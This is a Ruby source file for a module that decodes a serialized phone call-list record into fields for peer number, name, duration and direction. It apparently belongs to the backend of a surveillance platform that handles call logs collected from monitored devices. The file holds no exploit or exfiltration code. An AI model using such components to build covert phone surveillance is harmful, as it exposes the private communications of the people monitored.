require_relative 'common'
require_relative '../serializer'

module RCS
module CalllistEvidence

  def content
    raise "Not implemented!"
  end
  
  def generate_content
    raise "Not implemented!"
  end

  def decode_content(common_info, chunks)

    info = Hash[common_info]
    info[:data] ||= Hash.new

    stream = StringIO.new chunks.join

    @call_list = CallListSerializer.new.unserialize stream

    info[:data][:peer] = @call_list.fields[:number]
    info[:data][:peer] += " (#{@call_list.fields[:name]})" unless @call_list.fields[:name].nil?
    info[:data][:program] = 'Phone'
    info[:data][:status] = :history
    info[:data][:duration] = @call_list.end_time - @call_list.start_time
    info[:data][:incoming] = (@call_list.properties.include? :incoming) ? 1 : 0

    yield info if block_given?
    :delete_raw
  end
  
end # ::CalllistEvidence
end # ::RCS